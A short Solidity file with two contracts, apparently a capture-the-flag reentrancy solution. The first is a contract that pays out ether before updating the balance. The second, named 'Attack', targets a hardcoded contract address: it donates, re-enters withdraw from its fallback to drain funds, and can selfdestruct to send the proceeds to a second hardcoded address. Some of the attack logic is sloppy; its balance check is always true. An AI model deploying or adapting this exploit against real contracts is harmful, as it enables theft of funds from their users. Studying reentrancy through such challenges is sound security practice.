//SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

//import "../SafeMath.sol";

contract Reentrance {
  
  //using SafeMath for uint256;
  mapping(address => uint) public balances;
  bool private lock;

  //constructor () payable {}

  modifier Guard(){    
    require(!lock, "re-entered");

    lock = true;
    _;
    lock = false;
  }

  function getEth() public payable returns (bool) {
    return true;
  }

  function donate(address _to) public payable {
    //balances[_to] = balances[_to].add(msg.value);
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public Guard {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attack{
    address _addr = 0x71dEd1CED0985252Ba50FF5C412f2806A7844E2e;
    address new_owner = 0x02d09E69e528d7DA14F32Cd21b55aFFa1FF7F873;

    fallback() external payable {
      if (_addr.balance >= 0 ether){
        IReentrance(payable(_addr)).withdraw(0.001 ether);
      }
    }

    function kek() external payable {
      require(msg.value >= 0.001 ether);
      IReentrance(payable(_addr)).donate{value: 0.001 ether}(address(this));
    }

    function kekW() public payable {
      IReentrance(payable(_addr)).withdraw(0.001 ether);
    }

    function kill() external payable {
      selfdestruct(payable(new_owner));
    }
}

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}